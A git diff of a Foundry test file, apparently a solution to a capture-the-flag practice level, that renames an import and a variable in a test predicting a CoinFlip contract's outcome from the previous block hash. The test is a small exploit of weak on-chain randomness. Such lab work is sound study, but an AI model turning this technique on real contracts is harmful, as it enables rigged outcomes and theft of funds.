@@ -2,18 +2,18 @@
 pragma solidity ^0.6.0;
 
 import "forge-std/Test.sol";
-import "instances/level03.sol";
+import "instances/03_coinflip.sol";
 
 contract AttackerCoinFlipTest is Test {
     function testLevel03() external {
         vm.prank(address(0x1));
-        CoinFlip level03 = new CoinFlip();
+        CoinFlip coinflip = new CoinFlip();
 
         uint256 blockValue = uint256(blockhash(block.number - 1));
 
-        bool success = level03.flip(blockValue >> 255 == 1);
+        bool success = coinflip.flip(blockValue >> 255 == 1);
         assertTrue(success);
 
-        console.log("Consecutive Wins: ", level03.consecutiveWins());
+        console.log("Consecutive Wins: ", coinflip.consecutiveWins());
     }
 }
